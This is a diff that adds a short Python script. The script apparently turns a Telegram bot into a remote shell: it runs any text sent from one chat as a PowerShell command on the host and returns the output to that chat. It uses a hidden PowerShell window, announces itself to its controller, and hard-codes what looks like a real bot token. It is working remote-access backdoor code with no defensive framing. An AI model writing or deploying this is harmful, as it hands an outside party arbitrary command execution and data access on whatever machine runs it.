@@ -1,0 +1,30 @@
+﻿import telebot
+import subprocess
+
+BOT_TOKEN = "7121107982:AAHEs4EGv57F2J3kI8AxFeTKHFY5hgq8yX8"
+CHAT_ID = 1837395252
+
+bot = telebot.TeleBot(BOT_TOKEN)
+
+@bot.message_handler(func=lambda message: message.chat.id == CHAT_ID)
+def handle_command(message):
+    cmd = message.text.strip()
+    if cmd == "connect-to-cloud":
+        bot.send_message(chat_id=CHAT_ID, text="🛰️ Connecting Lucien to cloud...")
+        try:
+            subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", "Write-Host '✅ Lucien connected to cloud.' -ForegroundColor Cyan"])
+        except Exception as e:
+            bot.send_message(chat_id=CHAT_ID, text=f"❌ Error: {str(e)}")
+        return
+    try:
+        result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
+        output = result.stdout + result.stderr
+        if not output.strip():
+            output = "✅ Command executed with no output."
+        for i in range(0, len(output), 4000):
+            bot.send_message(chat_id=CHAT_ID, text=output[i:i+4000])
+    except Exception as e:
+        bot.send_message(chat_id=CHAT_ID, text=f"❌ Exception: {str(e)}")
+
+bot.send_message(chat_id=CHAT_ID, text="✅ Agent is ready. Waiting for commands.")
+bot.polling()
